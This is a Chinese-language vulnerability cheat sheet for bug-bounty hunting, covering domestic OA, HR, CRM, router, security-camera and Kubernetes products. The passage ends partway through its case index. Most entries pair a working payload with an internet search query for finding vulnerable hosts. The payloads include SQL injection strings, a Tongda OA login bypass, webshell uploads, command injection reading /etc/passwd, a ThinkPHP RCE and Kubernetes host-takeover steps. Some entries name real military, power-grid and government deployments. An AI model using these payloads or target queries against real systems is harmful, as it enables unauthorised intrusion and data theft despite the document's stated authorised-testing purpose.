# 国产 / 厂商系统漏洞速查表（企业与单位测试报告类）

> **回查原文** → `ima-retrieval-index.md` §四（按**产品名**搜最有效；ima `src报告/其他/Web` folder_id 见该表）。

> 生成日期：2026-09-14　|　**2026-09-15 重挖补录（§七）**
> 素材来源：ima 知识库 `src` → `src报告/其他/Web`（folder_id = `folder_7492580988187114`，共 547 条）
> 加工范围：其中"企业与单位测试报告"类（约 131 条，以被测单位/厂商系统命名的 doc/docx/pdf）
> **处置账（2026-09-15 更新）**：第一批精读 30 份；重挖第二轮**实读 8 份**（网络设备 6 + 云原生 1 + 行业专系统 1），全部写入 §七，一举补上 §六 列的"云原生偏少"与"安全设备指纹待扩"两个缺口；另有 15 份定位到但未读，按标题级索引登记于 §7.5，如实标注不臆造。
> **2026-09-15 订阅库复核**：订阅库「实战渗透与漏洞挖掘指南（可下载）」(kb `7353433464009178`) 的 `src2024` 目录（1016 项）**与主库同源**——文件名与字节数逐一对应（如 `officeweb365.docx` 均 2161271、`江苏兴光项目管理有限公司.docx` 均 561845、`山东迪彩.docx` 均 1610615），属同一批 NVDB 报送材料 + 公众号复盘的搬运副本，**不再重复开垦**；仅补录 §7.6 一条尚未沉淀的「框架级识别」增量。
> 关联文件：`_work/other-web-census.md`、`attack-chain-cases.md`、`logic-web-cases.md`、`sqli-cases.md`、`xss-cases.md`、`infoleak-cases.md`、`cmd-injection-cases.md`、`file-upload-cases.md`、`weak-password-cases.md`

## ⚠️ 红线声明（SRC 行为边界）

本技能包仅用于**授权范围内的漏洞挖掘 / SRC 提交 / 攻防演练**。以下内容中凡涉及「社工、钓鱼、免杀、买卖账号、真实公民隐私数据」均**只允许作为“风险识别与防御点”留存，禁止复现或用于实战**：

- 钓鱼邮件、伪造登录页、水坑攻击、鱼叉攻击（见「红队供应链+社工金融演练」「某银行攻防演练」）— 仅作 ATT&CK 复盘，**不可对真实目标实施**。
- 真实账号、明文口令、身份证号、手机号、银行卡号 — 一律不抄录，仅记录“存在泄露”这一事实。
- 云 AK/SK、OSS bucket、Redis 口令 — 仅记录泄露位置与利用链路，不留存可用凭据。

---

## 第一节　速查表（按产品 / 系统）

| # | 产品 / 系统 | 厂商行业 | 核心漏洞 | 指纹 / 利用要点 | FOFA 语法 |
|---|------------|---------|---------|----------------|----------|
| 1 | HJSOFT-HCM（宏景） | HR 人力 | 未授权访问 | `GET /workbench/duty/showmediainfo?kind=0&usernumber=...&planid=1&objectid=1` | `app="HJSOFT-HCM"` |
| 2 | 联达 OA（Hosp_Portal） | 医疗 OA | 任意文件上传 getshell | `POST /Hosp_Portal/uploadLogo.aspx`（filename=tt_test.asp）→ `/Hosp_Portal/Logo/tt_test.asp` | body 特征 |
| 3 | 同鑫 T9eHR | HR 人力 | 未授权接口 | `POST /Common/GetDropDownList`（DataSource=1*） | `body="T9eHR"` |
| 4 | 亿赛通 CDGServer3（DLP） | 数据安全 | SQL 注入 | `POST /CDGServer3/dojojs/../PolicyAjax` `id=-999';waitfor delay '0:0:5'--+` | body 特征 |
| 5 | 中广核 DTS | 能源 | 逻辑绕过重置密码 | 改返回包 `success:0`→`1` 绕过前端校验 | — |
| 6 | 金和 OA C6（北京金和网络） | OA | SQL 注入 | `GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1 WAITFOR DELAY '0:0:5'--` | — |
| 7 | 帮管家 CRM | CRM | SQL 注入 | `index.php/message?page=1&pai=1 and extractvalue(0x7e,concat(0x7e,(select user()),0x7e))#` | — |
| 8 | 企企通 SRM | SRM 供应链 | SQL 注入 | `POST /els/report/jmreport/queryFieldBySql` `{"sql":"select 1#'"}` | — |
| 9 | wuzhicms v4.1.0 | CMS | 代码审计 / 路由 | coreframe 框架，路由分析入手 | `body="wuzhicms"` |
| 10 | 熊海 xhcms | CMS | 文件包含 / SQLi / 越权登录 | `?r=../phpinfo` 包含；Cookie `user=admin` 任意登录；`?r=content&cid=1 and updatexml(...)` | — |
| 11 | 睿贝 CRM（RebeeCRM） | CRM | 路径穿越 | `/appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties` | — |
| 12 | 电信网关（管理后台） | 安全设备 | 默认口令 | 后台 `admin / hassmedia` | — |
| 13 | 浙江计量科学研究院 计量智检系统 | 质检 / 政务 | actuator 未授权 | `222.240.1.x:8190/api/actuator/env` + `/api/actuator/heapdump` | — |
| 14 | 贵州电网 充电通 | 电力 | heapdump / 任意文件读 / XSS | actuator heapdump 提取 redis 口令；`filePath=../../../../..//etc/passwd`；未授权接口泄露充电站/设备/人员 | — |
| 15 | 蓝凌 Landray-OA | OA | SQL 注入 | `/dossier/doc_fileedit_word.aspx?recordid=1' and 1=@@version--+&edittype=1,1`（MSSQL） | `app="Landray-OA系统"` |
| 16 | 通达 OA（Tongda） | OA | 登录绕过（未授权接管） | `POST /logincheck_code.php` 体 `UID=1` → 取 PHPSESSID → 直接访问 `/general/index.php` 为管理员 | `app="通达 OA"` |
| 17 | 中国兵器工业集团（通达 OA） | 军工（通达 OA 部署） | 同 #16 登录绕过 | 资产 `61.184.199.x:8989`（Office Anywhere 2017），手法与 #16 完全一致 | — |
| 18 | 某保险公司云服务器 | 金融 / 云 | 云凭据泄露接管 | Spring Boot `/actuator/env` 泄露华为云 OBS AK/SK + OSS bucket → 行云管家导入接管 37 台云主机 | — |
| 19 | 因酷网校 Inxedu（在线教育） | 教育 Java | XSS / IDOR / SQLi / 上传 | 课程搜索反射 XSS；`/uc/updateUser` 改 user.userId 越权；MyBatis `${}` `deleteArticleByIds`；`/video/uploadvideo` fileType=jsp getshell | `body="inxedu"` |
| 20 | **JeeSite 系快速开发平台**（江苏兴光 CCPM / 天津宏达 / 山东迪彩 / 河南同源 等**多家厂商二次开发**） | 通用 Java 平台 | SQL 注入（`mobile` 参数） | `/a/sys/register/registerUser?&mobile=1'`、`/a/sys/user/resetPassword?&mobile=1'`；指纹 `url="*/a/sys/*"`、`/a/login;JSESSIONID=` | `body="/a/sys/"`（另见 §7.6） |
| 20 | 某银行资产攻防演练 | 金融 | 上传 / 编辑器 / RCE | 分行上传绕过 getshell；ewebeditor 弱口令 `/newback/ewebeditor/`；ThinkPHP 5.0.23 RCE；Shiro | — |
| 21 | 美团 passport（OAuth） | 互联网平台 | 账号劫持（OAuth 缺陷） | `passport.meituan.com/account/callback/tencent?code=` 可复用绑定任意手机号 → 永久接管 | — |
| 22 | 美团漏洞_(1) | 互联网平台 | 同 #21 | 与 #21 为同一 OAuth 劫持案例，仅字节微差，合并为 1 案 | — |
| 23 | 红队供应链+社工金融演练 | 金融（红队） | ⚠️ 社工/钓鱼 + 域控 | 第三方电子学习平台(供应链)为突破口→上传 getshell→水坑打办公 PC→绕过 AC→CVE-2020-1472 Zerologon 打域控 | — |
| 24 | 转转 Zhuanzhuan | 互联网二手 | JSONP 劫持 / IDOR / 跳转 | `callback=hijacking` 触发 jsonp；子域 CORS 宽松劫持订单；`/zzopen/gameAccount/findOrderAccountInfo` 越权看账号口令；APP scheme 任意跳转 | — |
| 25 | 桂平市人民医院 人力资源系统 | 医疗 | 任意文件读取 | Resin 文档目录：`/resin-doc/viewfile/?file=index.jsp`（Resin viewfile 漏洞） | — |
| 26 | 生态环境部（rr.mee.gov.cn） | 政府 | Struts2 命令执行 | `/resetpwd_getServerDate.action` 存在 S2-016；全国核技术利用辐射安全申报系统 | `host="rr.mee.gov.cn"` |
| 27 | 百度爱番番（CRM） | 互联网 / 百度 | 支付逻辑缺陷 | 总金额=单价×数量，改单价使 7980→0.03 元下单（漏洞已修复） | — |
| 28 | 微博 会员跨年狂欢趴 | 互联网 / 微博 | 活动逻辑缺陷 | `POST /v1/act/handle` `{"actid":1}`，改参绕过“不在举办时间”限制抽奖（中危） | — |
| 29 | 小度商城（Baidu dumall） | 互联网 / 百度 | 秒杀数量限制绕过 | 抓包改 `itemQuantity` 突破“限购 1 个”薅羊毛 | `app="小度商城"` |
| 30 | 中国电信综合办公系统 | 运营商 | SQL 注入 | `POST /login.do` `dispatch=loginCheck&username=test*...` 注入点 username（MySQL 时间盲注） | — |
| 31 | **锐捷 NBR 系列路由器**（9 款） | 网络设备 | 未授权读全量配置 | `GET /index.data?opt=err&_=1663068005`（端口 9999），吐版本号/序列号/WAN IP+掩码+网关/PPPoE/接口状态 | `title="锐捷网络" && port="9999"` |
| 32 | **锐捷睿易网关**（BCOS/RYOS） | 网络设备 | 弱口令 + LuCI 后台 | `admin:admin` 登录 `/cgi-bin/luci/;stok=<随机>/admin`，端口 6060/8000/9001 | `body="锐捷\|睿易"` |
| 33 | **网心云设备**（onething） | 边缘计算盒 | 未授权直进后台 | 端口 9999 直接进管理页，暴露 SN 码/MAC/内网 IP，且可**提取日志、设备重启、设备复位** | `app="网心云设备"` |
| 34 | **H3C ER6300 路由器** | 网络设备 | 未授权三连（日志+关验证码+全站操作） | `POST /ER6300_SYSLOG.log` 下日志；`POST /goform/aspForm` `CMD=SetExpiretime...&vld_disable_flag=1` 关验证码；同类 body `CMD=IDS&GO=protect_ids.asp` 可未授权关 IDS | `"H3C" && title=="ER6300系统管理"` |
| 35 | **宇视 ISC**（ISC5000-E） | 安防 | 远程命令执行 | `GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>dudesuite.txt` → 取 `/Interface/LogReport/dudesuite.txt` | `title=="ISC5000-E"` |
| 36 | **安美数字 酒店宽带运营系统**（HiBOS2） | 酒店 | 远程命令执行 | `/manager/radius/server_ping.php?ip=127.0.0.1\|cat%20/etc/passwd>../../pq.txt&id=1` → 访问 `/pq.txt` | `"酒店宽带运营"` |
| 37 | **K8s API Server** | 云原生 | 未授权 → 接管宿主机 | 8080（`--insecure-port`，1.20+ 已移除）/ 6443（`system:anonymous` 误绑 `cluster-admin`）→ `kubectl -s` 远程 → secrets 取 token → 建 `hostPath:/` Pod → 写 SSH 公钥或 crontab | `app="Kubernetes"` |
| 38 | 指挥调度中心 / 用友文件服务器 / AJ-Report / 博达 / Joomla / Weblogic | 政务·ERP·组件 | 未授权·文件操作·RCE | 标题级索引，未精读，见 §七 | — |
| 39 | **泛微 e-cology**（**补录 2026-09-16，实测**） | OA（**高校/政务常见**） | **未授权访问** | `GET /api/ec/dev/app/test` 未认证即返回 `{"msg":"ok","ec_id":"…","ec_url":"…","em_url_open":"…"}` —— 吐内部 id + **旁系资产地址（含非标端口）**。指纹：`Set-Cookie: ecology_JSessionid`、`/js/jquery/jquery_wev8.js`、`/wui/index.html`；**单请求硬指纹（首页 `ETag` + `Last-Modified`，两版本不同）见 `recon-fingerprint-cdn-wildcard.md` §1.3** | `app="泛微-协同办公OA"` / `body="ecology_JSessionid"` |
| 40 | **泛微 e-cology**（同上产品） | OA | SQL 注入 | `/mobile/%20/plugin/browser.jsp` 的 `keyword` 参数，**须三层 URL 编码**：`sqlmap -r sqli.txt --tamper=urlencode3`；MSSQL 不支持堆叠 → 手开 `xp_cmdshell` | 同 #39 |
| 41 | **泛微 e-cology**（同上产品） | OA | 默认口令 / 配置泄露 | `sysadmin/1`、`sysadmin/Weaver@2001`；配置文件 `weaver.properties` / `fc.properties` | 同 #39 |
| 42 | **泛微 移动管理平台**（`/emp` 线，**2026-09-16 批量实测 23+ 站**） | OA（移动端，**与 e-cology 是不同产品**） | 识别为主（打法未实测，**不编**） | 指纹：title「**移动管理平台-企业管理**」+ `/page/manage/js/main.js`（`?YYYYMMDD` 版本戳）+ 正文 `window.apiPrifix="/emp"` + `jsencrypt.min.js` + `weaver` 图标字体 + 默认 logo `ms.wx.weaver.com.cn/common/images/tenant_default.png`。后端 Spring Boot，404 返 `{"timestamp":"yyyy-MM-dd HH:mm:ss","status":404,...}`（**时间戳非 ISO = 定制格式**）。常见命名 `moa.*` / `mobile.*` / `app.*` / `oa-wechat.*`。**⚠️ 判据只能靠 title，不能靠体积**（chunked 无 `Content-Length`，体积随版本戳/语言变：`?20211012`≈835B、`?20260909`≈2162B，同代还有 2100/2112） | `title="移动管理平台"` / `body="/page/manage/js/main.js"` |

> ⚠️ **泛微产品线别搞混（三条，路径全不通用）**：
> - **e-cology**（大中企业/高校主力）：`ecology_JSessionid` + `wev8` + `/wui/` + `/api/ec/dev/`；首页 `ETag` + `Last-Modified` 是单请求硬指纹，**有两个版本（3235 与 3139），具体见 `recon-fingerprint-cdn-wildcard.md` §1.3**
> - **e-office / E-Mobile**：`/weaver/`
> - **移动管理平台**（#42）：title「移动管理平台-企业管理」+ `/page/manage/` + `/emp`
>
> 拿一条线的路径打另一条线，一定打空。**2026-09-16 批量实测 234 个教育资产：泛微系占多数（e-cology 约 69 + 移动端约 30 + 仅体积疑似 17），是教育资产里最常见的厂商成品系统之一。⚠️ 但样本取自某报告集合，该集合本身泛微偏置（202 份里 124 份打的是同一条泛微路径），所以这个比例是「样本构成」而非「行业市占率」，别当结论引用。**

> **#31~#37 为 2026-09-15 重挖补录**（此前 §五"未精读"中降优先级的一批，实为最高价值的一类）。详见 **§七**。

---

## 第二节　按行业要点

### OA / HR / ERP / CRM / SRM（企业协同）
- **通达 OA / 蓝凌 / 金和 OA / 宏景 HCM / 同鑫 T9eHR / 帮管家 / 企企通 / 睿贝 CRM** 是“企业与单位测试报告”里最高频的一类。共同点：
  - 通达 OA 的 `logincheck_code.php` + `UID=1` 登录绕过在多个不同单位（青山钢铁、宏润化工、成都棠湖、中国兵器工业集团）**复现同一手法**，说明该 Nday 在存量系统极普遍，SRC 提交前务必先查是否已收录。
  - HR/CRM/SRM 类普遍把“查询/下拉/报表”接口做成**未授权或仅靠参数拼接 SQL**，SQLi 与越权读取是主旋律（亿赛通、企企通、帮管家、宏景、同鑫）。
  - 上传类集中在“Logo/头像/视频”功能点（联达 OA、因酷网校），`fileType`/`filename` 可控即 getshell。

### 安全设备 / 云原生
- **电信网关**后台默认口令 `admin/hassmedia`——安全设备管理端弱口令是老问题，先扫默认凭据再谈漏洞。
- **保险云 / 贵州电网充电通**代表“配置泄露→横向”链路：Spring Boot `actuator/env`、`heapdump` 未授权直接吐出云 AK/SK、Redis/OBS 口令，进而接管云主机或读敏感文件。**凡遇 Java 资产先探 `/actuator`**。

### 医疗 / 电力 / 政府 / 质检
- **桂平市人民医院**（Resin viewfile 任意读）、**浙江计量院 / 贵州电网**（actuator 泄露）说明行业系统常带“文档服务/监控端点”且未鉴权。
- **生态环境部** S2-016 证明政府老站点 Struts2 仍大量存活，指纹 `resetpwd_*` / `getServerDate.action` 一类 action 名可直接扫。

### 网络设备 / 物联网设备（2026-09-15 重挖补录，见 §7.1）

- 本库此前只有"电信网关默认口令"1 例，是最大的指纹空洞。重挖后一次补入 **6 个可复用指纹**：锐捷 NBR 全系（WayOS）、锐捷睿易（LuCI）、网心云、H3C ER6300（Miniware-Webs）、宇视 ISC、安美 HiBOS2。
- **先认固件商，再认品牌**：锐捷 NBR = WayOS、锐捷睿易 = OpenWrt LuCI、H3C ER = Miniware-Webs。一个固件层 PoC 往往横扫多个品牌，提交时按"固件层通病"写才不被判"厂商已收录"。
- **端口不在 80/443**：9999（网心云、锐捷 NBR 全系）、6060/8000/9001（锐捷睿易）、5555/8080/8081/8888/8008（H3C）、8088/7443/7070/7080（安美）。常规 Web 扫描会全漏。
- **头号问题是"功能端点不鉴权"而非注入**：`/goform/aspForm`、`/cgi-bin/luci/`、`CMD=xxx&GO=xxx.asp` 这类老式嵌入式框架，去掉 Cookie 重放即可未授权改配置（关 IDS、关验证码、下日志、复位设备）。危害比只读型信息泄露高一档。
- **验证止步于读取**：设备后台多带"重启/复位/改路由"，真执行就从漏洞提交变成破坏。

### 云原生 / 容器（2026-09-15 重挖补录，见 §7.2）

- **凡见 Java/K8s 资产，先探 `/actuator`，再探 6443/8080**：前者吐云 AK/SK 与 Redis 口令（#18 保险云、#14 充电通），后者直接给集群权限（#37）。
- K8s 未授权两个成因要分开写：**8080** 是设计上无认证（1.20+ 已移除，只见于老集群/手工改配置）；**6443** 是运维误配 `system:anonymous → cluster-admin`。后者是国内"K8s 未授权"的真实主因。
- **取证要走到"读宿主机文件"**：只 `get pods` 常被判中危；建 `hostPath: /` 的 Pod 后 `cat /mnt/etc/passwd` 才是完整危害链。

### 电商 / 社交 / 二手平台（逻辑类，建议并入 logic-web-cases）
- 百度爱番番（改单价）、微博（绕过活动时间）、小度商城（突破限购）、转转（JSONP+越权+价格篡改）、美团（OAuth 劫持）本质都是**业务/逻辑漏洞**，与“厂商系统指纹”关联较弱，已同时在 `logic-web-cases.md` 留痕，本表仅作厂商维度索引。

---

## 第三节　重复提交 / 拒收经验

1. **同手法跨单位复现 = 高概率拒收**：通达 OA `logincheck_code.php` 绕过在兵器工业、青山钢铁等多份报告里完全一致；SRC 若已收录该 Nday 通杀，单份单位报告易被“重复/已知”驳回。建议提交时附**该单位独有资产 + 影响面**，而非只给通用 PoC。
2. **同一案例多副本**：美团 OAuth 劫持有 `美团漏洞.pdf` / `_(1)` / `_(2)` 三份（size 1657507 / 1657296 / 1657296），内容实质相同；`_(1)` 与 `_(2)` size 一致可合并，`pdf` 与 `_(1)` 仅字节微差仍视为同一案。提交前先做 size+关键内容比对。
3. **平台已知 / 内部已修复**：美团 OAuth 劫持状态为“已忽略（内部已知）”；百度爱番番支付逻辑“该漏洞已修复”。此类即使技术成立也难拿赏金，速查表保留指纹供“同类系统横向”用。
4. **已在其他案例文件覆盖的系统降优先级**：致远、用友、若依、帝国 CMS、宇视、H3C、熵基、博达等已在 `attack-chain-cases.md` 等留痕，本批未重复精读，避免冗余。
   - ⚠️ **2026-09-16 更正**：本条原先也把**泛微**列在内，但实测该指针**落空** —— `attack-chain-cases.md` 里泛微只有 `browser.jsp` 注入、默认口令、`weaver.properties` 三条，**没有未授权访问**。故已在 §一 表**补录 #39~#41 泛微 e-cology 三条**，不再依赖跨文件指针。
   - **教训**：写「已在 X 文件留痕」这种跨文件指针前，**先 grep 一遍 X 里到底有没有**。指针落空 = 判据凭空消失，且没人会发现。
5. **逻辑薅羊毛类易被判低危/重复**：oppo 突破购买数量、小度秒杀、微博活动均属典型“业务逻辑”，单独提交常被合并或定低危；宜作为“支付/活动类通用检查项”沉淀，而非逐站提交。

---

## 第四节　案例索引（精读稿，每份 120~200 字）

**【1】宏景 HJSOFT-HCM（HR）**　media:`word_..._7c107f6af592c904a9eb98b0d257ba1b7492290188703512`
宏景 HCM 人力系统存在未授权接口，直接 GET `/workbench/duty/showmediainfo?kind=0&usernumber=...&planid=1&objectid=1` 即可在未登录状态下读取值班/媒体信息，无需会话校验。FOFA 以 `app="HJSOFT-HCM"` 定位资产。属于“接口未鉴权”类，SRC 中常因影响面大而中高危；报告还给出多个政务/国企部署实例。提交时建议补充可越权读取的具体敏感字段截图，并说明是否可遍历 usernumber 批量拉取。

**【2】联达 OA（医疗 Hosp_Portal）**　media:`word_..._eceeb937fe8bfe2e64ec2cea6f61d67c7492290188703512`
联达 OA 的 `Hosp_Portal` 模块上传点 `POST /Hosp_Portal/uploadLogo.aspx` 未校验文件类型，将 filename 设为 `tt_test.asp` 即可把 Webshell 落至 `/Hosp_Portal/Logo/tt_test.asp` 并直接访问 getshell。属于“任意文件上传”类高危。注意其路径/参数名与泛微、通达不同，是联达自有组件，FOFA 需靠 body 特征或标题定位。报告附了医院资产实例，提交建议附带 shell 路径与 phpinfo 确认。

**【3】同鑫 T9eHR（HR）**　media:`word_..._89af65f88bb60ff86ab7901c37f99b007492290188703512`
同鑫 T9eHR 人力系统 `POST /Common/GetDropDownList` 接口在未登录时可被调用，参数 `DataSource=1*` 直接拼接，可未授权拉取下拉数据源（员工/部门等）。FOFA 以 `body="T9eHR"` 定位。属“未授权接口+参数注入”边界，影响取决于返回内容是否含敏感人事数据。建议在报告中确认能否遍历不同 DataSource 枚举组织全量人员，以争取更高评级。

**【4】亿赛通 CDGServer3（DLP 数据泄露防护）**　media:`word_..._d708711dfe29e50b3b50c8762c2813747492290188703512`
亿赛通 DLP 的 `CDGServer3` 策略接口 `POST /CDGServer3/dojojs/../PolicyAjax` 中 `command=selectOption&id=` 处存在 SQL 注入，用 `id=-999';waitfor delay '0:0:5'--+&type=JMCL` 可触发 MSSQL 时间盲注。属“SQLi”高危，且目标是数据安全防护产品本身，讽刺性强、影响大。提交建议用 `extractvalue`/`waitfor` 稳定证明，并确认是否可跨库读配置与策略。

**【5】中广核 DTS（能源）**　media:`word_..._897801ae985336c7d933132c0dfc391b7492290188703512`
中广核某 DTS 系统重置密码功能存在前端校验缺陷：服务端返回 `success:0` 时被前端拦截，但把返回包改为 `success:1` 即可绕过校验完成密码重置。属“响应包篡改/逻辑绕过”中高危。这类漏洞依赖抓包改响应，报告需证明可重置他人账号而非仅自己。因涉及能源关键基础设施，提交须严格在授权范围内并走 SRC 白名单流程。

**【6】金和 OA C6（北京金和网络）**　media:`word_..._bd5bbe64445f1f8f01431cf01a6534717492290188703512`
金和 OA C6 的 `IncentivePlanFulfill.aspx` 中 `IncentiveID` 参数存在 SQL 注入，用 `1 WAITFOR DELAY '0:0:5'--` 可触发 MSSQL 延时。属“SQLi”高危。金和 OA 与泛微/致远同属国产 OA 大盘，但漏洞点独立，未被既有案例覆盖。提交建议附延时截图与数据库版本回显，并确认是否可 `execute`/`xp_cmdshell` 升级为 RCE。

**【7】帮管家 CRM**　media:`word_..._588b3c5180e23208fe0a548d1298e1797492290188703512`
帮管家 CRM 的消息接口 `index.php/message?page=1&pai=` 存在 SQL 注入，用 `1 and extractvalue(0x7e,concat(0x7e,(select user()),0x7e))#` 可报错回显当前数据库用户。属“SQLi（报错注入）”中高危。该 CRM 多为中小企业部署，资产分散，FOFA 难统一指纹；建议提交时附具体域名与报错回显，证明可读取除 user() 外的业务表。

**【8】企企通 SRM（供应链）**　media:`word_..._f08778378cf156ad8615212dace387dd7492290188703512`
企企通 SRM 报表接口 `POST /els/report/jmreport/queryFieldBySql` 接受 JSON `{"dbSource":"","sql":"select 1#'"}`，服务端直接执行传入 SQL，存在 SQL 注入/任意查询。属“SQLi”高危，且 SRM 连通供应商数据，影响面广。提交建议确认 `dbSource` 为空时默认库范围，以及能否 `union` 读管理员/合同表。注意保留“仅查询、未写”的证据，避免越权写入争议。

**【9】wuzhicms v4.1.0（CMS 代码审计）**　media:`word_..._8911594b43585bc4ad30f6c6a6767b3e7492290188703512`
wuzhicms v4.1.0 为 PHP CMS，基于 coreframe 框架。报告以“路由分析+代码审计”方式梳理前台入口、模块路由与鉴权缺失点，未给单一稳定 PoC 而是给出审计路径。属“代码审计”类素材，适合作为同类 PHP CMS 审计模板。建议后续补一个可复现的具体漏洞（如某控制器未授权/某参数注入）后再入库，否则仅凭审计笔记难以直接提交。

**【10】熊海 xhcms（CMS）**　media:`word_..._ed48d1eec5948846f4b594adff272e417492290188703512`
熊海 xhcms 存在三类问题：① 文件包含 `index.php?r=../phpinfo` 可读取任意路径；② 内容页 `?r=content&cid=1 and updatexml(...)` 报错注入；③ Cookie 置 `user=admin` 即可任意登录后台。属“包含+SQLi+认证绕过”组合，评级高。该 CMS 老旧、资产少，FOFA 难定位；提交价值在“教学/靶场”多于实战赏金。注意任意登录需证明可进后台而非仅 cookie 字段。

**【11】睿贝 CRM（RebeeCRM）**　media:`word_..._2361a2620867ad60177fecf86ac605ea7492290188703512`
睿贝 CRM 的 `/appPatchDownLoad` 接口 `fileName` 参数存在路径穿越，用 `../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties` 可读取安装配置文件（常含数据库口令等）。属“路径穿越/任意文件读”中高危。提交建议确认能否跳出 web 根读 `/etc/passwd` 或 windows 配置文件，并评估读到的凭据能否进一步接管数据库，以提升影响评级。

**【12】电信网关（安全设备默认口令）**　media:`word_..._43eb166436b754e393872e53f9a799557492290188703512`
某电信网关设备管理后台存在默认口令 `admin / hassmedia`，登录后即可进入管理界面。属“默认口令/弱口令”类，评级取决于后台权限（能否配置转发、读流量、上传）。安全设备默认凭据是高频低危项，SRC 常要求“可造成实质危害”才收；提交建议证明登录后能读取敏感配置或造成业务影响，而非仅登录成功。

**【13】浙江计量科学研究院 计量智检系统**　media:`word_..._2d804b5648aba3a08e74c5a16c48be617492290188703512`
浙江计量院计量智检系统 `222.240.1.x:8190/api/actuator/env` 与 `/api/actuator/heapdump` 未授权开放，env 泄露配置、heapdump 可提取内存中的口令/令牌。属“Spring Boot  actuator 未授权”高危。凡 Java/Spring 资产必扫 `/actuator`、`/api/actuator`。提交建议附 heapdump 中命中的口令字段（打码）与可进一步利用的链路，证明实际危害。

**【14】贵州电网 充电通**　media:`word_..._ae03a2c89297f70535c0083a887f4c1e887f4c1e7492290188703512`
充电通后台 `admin.charge.gapsd.com` 的 Spring Boot actuator 未授权，`/heapdump` 提取出 redis 口令（host 172.18.227.142）与 OSS 相关配置；另有任意文件读 `GET /api/account/shop/download/?Access-token=1&Client-digest=1&filePath=../../../../..//etc/passwd`、多处反射 XSS，以及未授权接口泄露近百充电站、379 设备、管理人员姓名手机号。属“配置泄露+文件读+XSS+信息泄露”组合高危。电力资产须走授权 SRC，严禁外传真实人员信息。

**【15】蓝凌 Landray-OA**　media:`word_..._7b5c2e13766c88f8be2f23c042f801407492290188703512`
蓝凌 OA 的 `/dossier/doc_fileedit_word.aspx` 中 `recordid` 参数存在 MSSQL 注入，用 `1' and 1=@@version--+&edittype=1,1` 触发报错回显数据库版本。FOFA `app="Landray-OA系统"` 可定位数万资产。属“SQLi”高危，且与泛微/致远 OA 注入点不同，属蓝凌自有组件。提交建议确认能否 `execute` 升级 RCE，并避免对政府/国企资产做非必要写入。

**【16】通达 OA（通用登录绕过）**　media:`word_..._f5a21d9c070bb38bdfb74e402c4a1c0e7492290188703512`
通达 OA 存在经典登录绕过：向 `POST /logincheck_code.php` 发送体 `UID=1`，服务端返回 `{"status":1,...,"url":"general/index.php?isIE=0"}` 并 Set-Cookie 一个 PHPSESSID；持该会话直接访问 `/general/index.php` 即以系统管理员身份进入，无需密码。在青山钢铁、宏润化工、成都棠湖等多单位复现。属“未授权接管/认证绕过”严重。注意该 Nday 可能已被 SRC 收录，提交需带本资产证据。

**【17】中国兵器工业集团（通达 OA 部署）**　media:`word_..._e580e883a1ca8394eb3e7c46aefedeb77492290188703512`
中国兵器工业集团公司门户 `61.184.199.x:8989`（Office Anywhere 2017 / 通达 OA）沿用与 #16 完全相同的 `logincheck_code.php` + `UID=1` 登录绕过，成功以 OA 管理员进入集团总部门户。手法与 #16 一致，本份作为“同一 Nday 在军工单位复现”的实例留存，**非新技术点**。涉及军工资产，仅作指纹与影响面记录，实战提交须严格授权。

**【18】某保险公司云服务器接管**　media:`word_..._d9871ce413c4f141ce6c133182ca0e447492290188703512`
对某保险资产目录扫描发现 Spring Boot 未授权 `/actuator/env`，其中泄露华为云 OBS 的 `ak`/`sk`/`bucketName` 及 OSS bucket 配置。利用行云管家导入这对 AK/SK，成功将该账号下 37 台云主机（华北北京四）导入并接管。属“云凭据泄露→云主机接管”严重链路。此类必须走 SRC 授权，且报告不得留存可用 AK/SK；本表仅记泄露位置与利用步骤。

**【19】因酷网校 Inxedu（Java 在线教育，代码审计）**　media:`pdf_..._8171e30330478008b608170e409f759c7492290188703512`
因酷网校（Inxedu，Spring MVC + MyBatis）审计出四类漏洞：① 课程搜索 `queryCourse.courseName` 反射 XSS（`"><img src=1 onerror=alert(1)>`）；② `/uc/updateUser` 无权限校验，改 `user.userId` 越权改他人资料；③ MyBatis `${}` 拼接，`deleteArticleByIds` 的 `articelId` 存在 SQL 注入（`IN (${value})`）；④ `/video/uploadvideo` 的 `fileType` 可控，传 jsp 马 getshell。属“综合代码审计”高价值教材，覆盖 XSS/IDOR/SQLi/上传。

**【20】某银行资产攻防演练**　media:`pdf_..._150a0b27e0c472af416f455ab9453c657492290188703512`
银行演练链路：① 分行前台注册上传点绕过白名单 getshell（复用 8080 端口上传路径）；② 微信公众号 `/newback/ewebeditor/` 编辑器弱口令登录→改样式上传后缀→传 Webshell；③ 小程序 ThinkPHP 5.0.23 命令执行（`_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=@eval(...)`）；④ ⚠️ 企业微信后台弱口令后“强制升级下发后门”属钓鱼/社工，已叫停；另用 Shiro。属“多向量打点”复盘，产品指纹（ewebeditor、TP5.0.23、Shiro）可横向复用。

**【21】美团 passport OAuth 账号劫持**　media:`pdf_ef5523fe3688445e28b47480a1382689_6de25d4bac905dff3c5bcab4cc0809697492290188703512`
美团/大众点评联合登录中，`passport.meituan.com/account/callback/tencent?code=` 的 OAuth code 可被截获后拼到点评 `pclogin?redir=` 诱导用户“绑定手机号”，从而把攻击者控制的手机号绑到受害者美团账号，实现**永久账号接管**（改密仍有效）。自评严重，但平台状态为“已忽略（内部已知）”。属“OAuth/第三方登录逻辑缺陷”，此类对微信/微博等同样值得横向排查，但实战须防越权与隐私红线。

**【22】美团漏洞_(1)（与 #21 同案）**　media:`pdf_..._534b68e46d982d5afe08af96d09a09867492290188703512`
与 #21 为同一 OAuth 账号劫持案例，`美团漏洞.pdf`(1657507) 与 `美团漏洞_(1).pdf`(1657296) 仅字节数微差、内容实质相同；`_(2).pdf` 亦同。按“去后缀+size 相同/近似合并”规则三份合并为 1 案。提示：同名多副本时仍需逐份比对 size，本例 size 不同但内容一致，故以内容判定而非单纯 size。

**【23】红队供应链+社工金融演练**　media:`word_..._5355beb55b9ee6848da56d4ca8b64ae57492290188703512`　⚠️ 红线（社工/钓鱼）
